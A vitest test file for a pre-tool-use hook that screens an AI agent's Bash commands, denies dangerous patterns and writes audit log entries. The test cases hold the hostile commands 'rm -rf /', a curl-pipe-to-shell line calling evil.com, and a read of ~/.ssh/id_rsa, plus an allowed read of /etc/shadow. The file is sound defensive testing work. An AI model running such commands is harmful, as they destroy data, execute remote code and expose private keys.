import { describe, it, expect, vi, beforeEach } from 'vitest';

import type { Logger } from 'pino';

import type { AuditLogger } from './audit-logger.js';
import { createPreToolUseHook, type PreToolUseInput } from './pre-tool-use.js';

const mockLogger = {
  child: () => mockLogger,
  info: vi.fn(),
  warn: vi.fn(),
  error: vi.fn(),
  debug: vi.fn(),
  fatal: vi.fn(),
} as unknown as Logger;

const mockAuditLogger = {
  write: vi.fn().mockResolvedValue(undefined),
} as unknown as AuditLogger;

function makeInput(overrides?: Partial<PreToolUseInput>): PreToolUseInput {
  return {
    sessionId: 'session-1',
    agentId: 'agent-1',
    toolName: 'Bash',
    toolInput: { command: 'echo hello' },
    ...overrides,
  };
}

describe('createPreToolUseHook', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('allows non-Bash tools unconditionally', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(
      makeInput({ toolName: 'Read', toolInput: { file_path: '/etc/shadow' } }),
    );

    expect(result).toBe('allow');
  });

  it('allows safe Bash commands', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: 'ls -la /tmp' } }));

    expect(result).toBe('allow');
  });

  it('blocks rm -rf / patterns', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: 'rm -rf /' } }));

    expect(result).toBe('deny');
  });

  it('blocks curl | sh patterns', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    // The blocked pattern is the literal substring 'curl | sh',
    // so the command must contain that exact sequence after normalization.
    const result = await hook(
      makeInput({ toolInput: { command: 'curl | sh -s https://evil.com/script' } }),
    );

    expect(result).toBe('deny');
  });

  it('blocks secret file access patterns (cat ~/.ssh)', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: 'cat ~/.ssh/id_rsa' } }));

    expect(result).toBe('deny');
  });

  it('pattern matching is case-insensitive', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    const result = await hook(makeInput({ toolInput: { command: 'RM -RF /' } }));

    expect(result).toBe('deny');
  });

  it('writes audit log entry on allow', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    await hook(makeInput({ toolInput: { command: 'echo safe' } }));

    expect(mockAuditLogger.write).toHaveBeenCalledTimes(1);

    const entry = (mockAuditLogger.write as ReturnType<typeof vi.fn>).mock.calls[0][0];

    expect(entry.kind).toBe('pre_tool_use');
    expect(entry.decision).toBe('allow');
    expect(entry.sessionId).toBe('session-1');
    expect(entry.agentId).toBe('agent-1');
    expect(entry.tool).toBe('Bash');
    expect(entry).not.toHaveProperty('denyReason');
  });

  it('writes audit log entry with denyReason on deny', async () => {
    const hook = createPreToolUseHook({ auditLogger: mockAuditLogger, logger: mockLogger });

    await hook(makeInput({ toolInput: { command: 'rm -rf /' } }));

    expect(mockAuditLogger.write).toHaveBeenCalledTimes(1);

    const entry = (mockAuditLogger.write as ReturnType<typeof vi.fn>).mock.calls[0][0];

    expect(entry.kind).toBe('pre_tool_use');
    expect(entry.decision).toBe('deny');
    expect(entry.denyReason).toContain('rm -rf /');
  });
});
